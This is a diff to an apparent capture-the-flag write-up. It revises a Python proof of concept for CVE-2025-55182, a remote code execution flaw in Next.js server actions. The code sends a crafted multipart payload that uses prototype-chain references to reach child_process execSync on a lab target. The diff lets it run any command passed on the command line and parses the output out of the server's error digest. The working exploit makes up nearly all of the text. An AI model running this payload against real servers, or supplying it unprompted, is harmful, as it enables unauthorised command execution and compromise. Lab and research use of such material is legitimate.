@@ -832,17 +832,23 @@ The PoC published by msanft at https://github.com/msanft/CVE-2025-55182 was sele
 ##### POC Code:
 
 ```python
-import requests, json, re, base64
+import requests, sys, json, re, base64
 
 BASE_URL = "http://10.129.13.245:3000/"
-CMD = "id"
+CMD = sys.argv[1]
 
+# Encode the command as base64
 b64_cmd = base64.b64encode(CMD.encode()).decode()
+
+# Build the JS code directly - using Buffer and execSync with args array
 js_prefix = f"""
 var cmd = Buffer.from('{b64_cmd}', 'base64').toString();
 var res = process.mainModule.require('child_process').execSync(cmd, {{timeout:5000}}).toString().trim();
 throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
 """
+
+# Remove newlines to fit in the prefix field
+js_prefix = js_prefix.replace('\n', ' ').strip()
 
 crafted_chunk = {
     "then": "$1:__proto__:then",
@@ -850,14 +856,33 @@ crafted_chunk = {
     "reason": -1,
     "value": '{"then": "$B0"}',
     "_response": {
-        "_prefix": js_prefix.strip(),
+        "_prefix": js_prefix,
         "_formData": {"get": "$1:constructor:constructor"},
     },
 }
 
-files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"')
+}
+
 headers = {"Next-Action": "x"}
+
 response = requests.post(BASE_URL, files=files, headers=headers)
+
+body = response.text
+m = re.search(r'1:E\{"digest":"(.*?)"\}', body, re.DOTALL)
+if m:
+    raw = m.group(1)
+    try:
+        decoded = json.loads('"' + raw + '"')
+    except:
+        decoded = raw.replace('\\n', '\n').replace('\\t', '\t')
+    print(decoded)
+else:
+    print(f"[Error] No output. Status: {response.status_code}")
+    print(body[:300])
+
 ```
 <div align="center">
 <br>
